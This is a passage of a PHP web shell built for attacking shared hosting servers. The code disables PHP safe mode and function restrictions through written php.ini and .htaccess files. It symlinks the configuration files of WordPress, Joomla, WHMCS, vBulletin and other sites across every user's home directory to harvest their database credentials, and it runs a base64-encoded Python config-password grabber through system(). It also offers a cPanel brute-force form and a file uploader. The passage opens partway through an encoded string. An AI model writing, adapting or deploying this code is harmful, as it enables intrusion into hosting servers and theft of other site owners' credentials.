ZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."> << BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}

				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."><< BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
	<strong>
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="3" align="center" style="italic" color="#00ff00">+--=[ Cpanel BruteForce ]=--+</font></center><br>
    <table width="600" border="0" class="tabnet" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="3" style="italic" color="#00ff00">[ Cpanel Brute Force ]</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Username List :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Password List :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
    <span class="style2"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font class="style2"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
	</strong>
	</span>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="Start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Get Config ]</strong></center></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="50" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Get Wordlist ]</strong></center></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="50" name="url" type="text" value="http://www."></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><center><strong>[ Info 
	Security ]</strong></center></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>	
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00ff00>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
}
?></strong></td></tr></table></table></table>
<?
break;

#########################bds

case '':

?><?php 

break;


// Uploader
case 'uploader':

echo '<center><b>+--=[ Uploader ]=--+</b><br><br><br><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<p align="center"><font face="Verdana" 

size="1"><font color="white"> Done !!</font><br>'; }
	else { echo '<font color="#FF0000">Failed :( </font></p>
	</td></table></tr>

'; }
}
break;

}}
?><br><br><br><center><form action='' method='post'>
<table class='tabnet' style='width:650px;' border=''>
<th colspan=10>Security Info</th><tr>
<td>System </td>
<td><?php
echo php_uname();?></td>
</tr>
 <tr>
    <td valign="top" bgcolor="" style="width: 139px">Safe Mode</td>
    <td valign="top" bgcolor="" colspan="5">
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>	
	</td>
    				</tr>
					  <tr>
    <td valign="top" bgcolor="" style="width: 139px">Desible Function</td>
    <td valign="top" bgcolor="" colspan="5">

<form method="POST" target="_blank">

<input name="matikan" type="hidden" value="sekatan">        				


<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00ff00>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
